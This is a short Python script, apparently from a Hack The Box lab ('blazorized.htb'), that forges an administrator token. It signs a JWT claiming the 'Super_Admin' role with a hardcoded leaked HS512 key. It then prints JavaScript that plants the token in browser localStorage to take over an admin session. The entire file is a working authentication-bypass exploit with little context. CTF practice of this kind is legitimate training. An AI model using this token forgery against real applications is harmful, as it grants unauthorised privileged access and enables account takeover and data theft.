import jwt
import datetime

# Define the payload
payload = {
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": [
        "Super_Admin"
    ],
    "exp": datetime.datetime.utcnow() + datetime.timedelta(seconds=600),  # Updated timestamp for expiration
    "iss": "http://api.blazorized.htb",
    "aud": "http://admin.blazorized.htb"
}

# Define the symmetric key
jwt_symmetric_security_key = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"

# Encode the JWT token
jwt_token = jwt.encode(payload, jwt_symmetric_security_key, algorithm='HS512')

# Print the JWT token (optional)
print(f"Generated JWT token: {jwt_token}")

# JavaScript snippet to set JWT token in local storage
js_code = f"""
localStorage.setItem('jwt', '{jwt_token}');
console.log('JWT token set in local storage');
"""

# Print the JavaScript code
print("JavaScript to set JWT in local storage:")
print(js_code)